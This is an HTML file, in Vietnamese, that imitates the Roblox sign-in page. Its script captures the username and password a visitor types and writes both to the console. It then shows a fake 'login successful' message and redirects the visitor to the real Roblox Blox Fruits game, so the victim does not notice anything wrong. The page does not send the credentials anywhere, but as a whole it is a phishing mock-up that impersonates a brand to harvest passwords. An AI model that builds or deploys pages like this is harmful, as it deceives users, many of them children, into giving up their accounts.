<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng nhập vào Roblox</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #0f0f0f;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #1a1a1a;
            padding: 20px;
            border-radius: 8px;
            width: 400px;
            text-align: center;
            box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.1);
        }
        .login-container h2 {
            color: white;
            margin-bottom: 15px;
            font-size: 22px;
        }
        input {
            width: 90%;
            padding: 12px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #333;
            background-color: #262626;
            color: white;
            outline: none;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }
        button {
            width: 90%;
            padding: 12px;
            margin-top: 10px;
            border-radius: 5px;
            border: none;
            background-color: #3c82f6;
            color: white;
            cursor: pointer;
            font-size: 16px;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }
        button:hover {
            background-color: #1d4ed8;
        }
        .forgot-password {
            margin-top: 15px;
            color: #9ca3af;
            font-size: 14px;
            cursor: pointer;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Đăng nhập vào Roblox</h2>
        <input type="text" id="username" placeholder="Tên người dùng/Địa chỉ email/Số điện thoại">
        <input type="password" id="password" placeholder="Mật khẩu">
        <button onclick="redirectToRoblox()">Đăng nhập</button>
        <div class="forgot-password">Bạn quên mật khẩu hoặc tên người dùng?</div>
    </div>

    <script>
        function redirectToRoblox() {
            let username = document.getElementById("username").value;
            let password = document.getElementById("password").value;
            
            console.log("User:", username);
            console.log("Password:", password);
            
            alert("Đăng nhập thành công! Đang chuyển hướng...");
            
            setTimeout(() => {
                window.location.href = "https://www.roblox.com/vi/games/2753915549/Blox-Fruits";
            }, 1000);
        }
    </script>
</body>
</html>
